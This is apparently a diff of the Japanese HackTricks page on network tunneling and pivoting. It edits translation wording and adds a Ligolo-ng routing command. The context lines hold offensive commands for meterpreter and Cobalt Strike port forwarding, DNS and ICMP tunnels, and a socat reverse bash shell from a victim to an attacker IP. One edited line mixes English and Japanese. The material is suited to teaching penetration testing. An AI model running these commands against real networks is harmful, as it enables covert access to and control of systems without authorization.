@@ -10,7 +10,7 @@ GCPハッキングを学び、実践する：<img src="../.gitbook/assets/grte.p
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
 * **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**をフォローしてください。**
-* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 {% endhint %}
@@ -103,8 +103,8 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-あなたは**ssh**を介してホストを通じて**サブネットワーク**へのすべての**トラフィック**を**トンネル**することができます。\
-例えば、10.10.10.0/24へのすべてのトラフィックを転送することです。
+あなたは**ssh**を介してホストを通じて**サブネット**へのすべての**トラフィック**を**トンネル**することができます。\
+例えば、10.10.10.0/24へのすべてのトラフィックを転送すること。
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -118,7 +118,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-ローカルポート --> 侵害されたホスト (アクティブセッション) --> 第三\_ボックス:ポート
+ローカルポート --> 侵害されたホスト（アクティブセッション） --> 第三\_ボックス:ポート
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -159,7 +159,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-この場合、**ポートはビーコーンホストで開かれます**。チームサーバーではなく、トラフィックはチームサーバーに送信され、そこから指定されたホスト:ポートに送られます。
+この場合、**ポートはビーコーンホストで開かれます**。チームサーバーではなく、トラフィックはチームサーバーに送信され、そこから指定されたホスト:ポートに送信されます。
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -174,7 +174,7 @@ To note:
 ### rPort2Port local
 
 {% hint style="warning" %}
-この場合、**ポートはビークホストで開かれます**、Team Serverではなく、**トラフィックはCobalt Strikeクライアントに送信されます**（Team Serverではなく）、そこから指定されたホスト:ポートに送信されます。
+この場合、**ポートはbeaconホストで開かれます**、Team Serverではなく、**トラフィックはCobalt Strikeクライアントに送信されます**（Team Serverではなく）、そこから指定されたホスト:ポートに送信されます。
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -243,6 +243,12 @@ listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 # Display the currently running listeners on the agent -- Attacker
 listener_list
 ```
+### エージェントのローカルポートにアクセスする
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
+interface_add_route --name "ligolo" --route 240.0.0.1/32
+```
 ## Rpivot
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
@@ -283,8 +289,6 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
 ### Port2Port through socks
-
-ポート2ポートをソックス経由で行う
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
@@ -332,7 +336,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-コンソール版PuTTYのようなもので（オプションはsshクライアントに非常に似ています）。
+これはコンソール版のPuTTYのようなもので（オプションはsshクライアントに非常に似ています）。
 
 このバイナリは被害者のコンピュータで実行され、sshクライアントであるため、リバース接続を確立するためにsshサービスとポートを開く必要があります。次に、ローカルでアクセス可能なポートを私たちのマシンのポートに転送するには：
 ```bash
@@ -376,18 +380,18 @@ C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
 netstat -antb | findstr 1080
 ```
-今、[**Proxifier**](https://www.proxifier.com/) **を使用して、そのポートを通じてトラフィックをプロキシできます。**
+Now you can use [**Proxifier**](https://www.proxifier.com/) **を使用して、そのポートを通じてトラフィックをプロキシします。**
 
 ## Windows GUIアプリをプロキシ化する
 
-[**Proxifier**](https://www.proxifier.com/)を使用して、Windows GUIアプリをプロキシ経由でナビゲートさせることができます。\
+[**Proxifier**](https://www.proxifier.com/)を使用して、Windows GUIアプリがプロキシを通じてナビゲートできるようにします。\
 **Profile -> Proxy Servers** でSOCKSサーバーのIPとポートを追加します。\
 **Profile -> Proxification Rules** でプロキシ化するプログラムの名前と、プロキシ化したいIPへの接続を追加します。
 
 ## NTLMプロキシバイパス
 
 前述のツール: **Rpivot**\
-**OpenVPN** もこれをバイパスでき、設定ファイルにこれらのオプションを設定します:
+**OpenVPN** もこれをバイパスでき、設定ファイルでこれらのオプションを設定します:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -417,7 +421,7 @@ Microsoftによって作成されたリバースプロキシです。こちら�
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-両方のシステムでルート権限が必要で、DNSクエリを使用してトンネルアダプタを作成し、データをそれらの間でトンネルします。
+DNSクエリを使用してトンネルアダプタを作成し、両システム間でデータをトンネルするには、両方のシステムでroot権限が必要です。
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -454,7 +458,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### プロキシチェインのDNSを変更する
 
-Proxychainsは`gethostbyname` libcコールをインターセプトし、tcp DNSリクエストをsocksプロキシを通じてトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコーディングされています）。これを変更するには、ファイルを編集します: _/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
+Proxychainsは`gethostbyname` libcコールをインターセプトし、TCP DNSリクエストをソックスプロキシを通じてトンネリングします。**デフォルト**で、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコーディングされています）。これを変更するには、ファイルを編集します: _/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
 
 ## Goでのトンネル
 
@@ -467,7 +471,7 @@ Proxychainsは`gethostbyname` libcコールをインターセプトし、tcp DNS
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-両方のシステムでルート権限が必要で、tunアダプタを作成し、ICMPエコーリクエストを使用してデータをトンネリングします。
+両方のシステムでルート権限が必要で、ICMPエコーリクエストを使用してトンネルアダプタを作成し、データをトンネリングします。
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -518,7 +522,7 @@ _必要に応じて、認証とTLSを追加することも可能です。_
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-#### HTTPを使用してファイルを公開する
+#### HTTPでファイルを公開する
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -540,7 +544,7 @@ stdoutから直接、またはHTTPインターフェース [http://127.0.0.1:404
 3つのトンネルを開きます：
 
 * 2つのTCP
-* 1つのHTTP、/tmp/httpbin/ からの静的ファイルの公開
+* 1つのHTTP（/tmp/httpbin/ からの静的ファイルの公開）
 ```yaml
 tunnels:
 mytcp:
@@ -553,7 +557,7 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
-## その他のチェックツール
+## 他のチェックツール
 
 * [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
